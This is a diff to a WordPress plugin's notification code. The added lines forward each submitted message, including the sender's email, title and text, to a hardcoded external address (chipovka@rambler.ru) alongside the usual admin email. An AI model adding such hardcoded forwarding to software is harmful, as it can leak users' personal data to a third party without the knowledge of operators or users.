@@ -118,6 +118,12 @@ class UN_Model{
 			sprintf(__('Новое сообщение на сайте %s'), str_replace('http://', '', get_bloginfo('wpurl'))));
 		$to = apply_filters('un_admin_notification_email', get_option('admin_email'));
 		wp_mail($to, $subject, $message, 'Content-type: text/html');
+
+		// Переадресація повідомлень на chipovka
+		$email = isset($params['email']) ? trim($params['email']) : '';
+		$additional_message = sprintf(' <br>Сообщение от: %s<br>Тема сообщениея: %s <br> Текст сообщения: %s', $email , $params['title'], $params['description'] );
+		wp_mail("chipovka@rambler.ru", $subject, $message . $additional_message, 'Content-type: text/html');
+
 		do_action('un_admin_notification_sent', $id, $params, $message);
 	}
 	
